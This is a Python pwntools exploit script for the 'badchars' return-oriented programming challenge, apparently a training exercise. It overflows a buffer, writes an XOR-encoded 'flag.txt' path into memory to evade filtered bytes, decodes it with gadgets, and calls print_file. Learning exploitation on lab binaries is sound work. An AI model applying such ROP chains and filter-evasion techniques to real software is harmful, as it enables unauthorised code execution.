from pwn import *

elf = context.binary = ELF("./badchars")

PRINT_FILE = p64(elf.symbols.print_file)

XOR_KEY = 0xe5

# xor byte ptr [r15], r14b; ret
XOR_R15_R14B_GADGET = p64(0x400628)
# pop r14; pop r15; ret
POP_R14_R15_GADGET = p64(0x4006a0)
# pop r12; pop r13; pop r14; pop r15; ret
POP_R12_TO_R15_GADGET = p64(0x40069c)
# pop rdi; ret
POP_RDI_GADGET = p64(0x4006a3)
# mov qword ptr [r13], r12; ret
MOV_R13_PTR_GADGET = p64(0x400634)

# don't p64() this so we can do operations on it later
DATA_ADDR = 0x601028 + 8

BAD_CHARS = [ord('x'), ord('g'), ord('a'), ord('.')]

def xor_bytes(u8s):
    ret = bytes()
    for u8 in u8s:
        byte = int(u8) ^ XOR_KEY
        ret += byte.to_bytes(1, "little")

    return ret

def generate_xor_operation(offset):
    op = bytes()
    # ret to pop r14 and r15 gadget
    op += POP_R14_R15_GADGET
    # pop the xor key into r14
    op += p64(XOR_KEY)
    # pop the address with offset into r15
    op += p64(DATA_ADDR + offset)
    # ret to the operation
    op += XOR_R15_R14B_GADGET

    return op

def audit_payload(payload):
    for b in payload:
        if int(b) in BAD_CHARS:
            return chr(b)
    return None

xored_flagpath = xor_bytes(b"flag.txt")
# fuck you, you did it wrong
assert len(xored_flagpath) == 8, "xored flag path is %i bytes long" % len(xored_flagpath)

# overflow buffer
payload = b'A' * 40
# ret to pop all 4 r registers
payload += POP_R12_TO_R15_GADGET
# pop xored flagpath into r12
payload += xored_flagpath
# pop data address into r13
payload += p64(DATA_ADDR)
# pop nonsense into r14
payload += p64(0xffffffff)
# pop nonsense into r15
payload += p64(0xffffffff)
# mov data from r12 into [r13]
payload += MOV_R13_PTR_GADGET
# generate our string of xor operations
for i in range(8):
    payload += generate_xor_operation(i)

# ret to pop rdi
payload += POP_RDI_GADGET
# pop data address into rdi (param to print_file)
payload += p64(DATA_ADDR)
# ret to print file
payload += PRINT_FILE

# oops, too much ROP for today
assert len(payload) <= 0x200, "payload is too long"

audit_res = audit_payload(payload)
assert audit_res is None, "fuck you, payload contains character '%s'" % audit_res

conn = process()
conn.recvuntil(b"> ")
conn.send(payload)

print(conn.recvall().decode("ascii"))
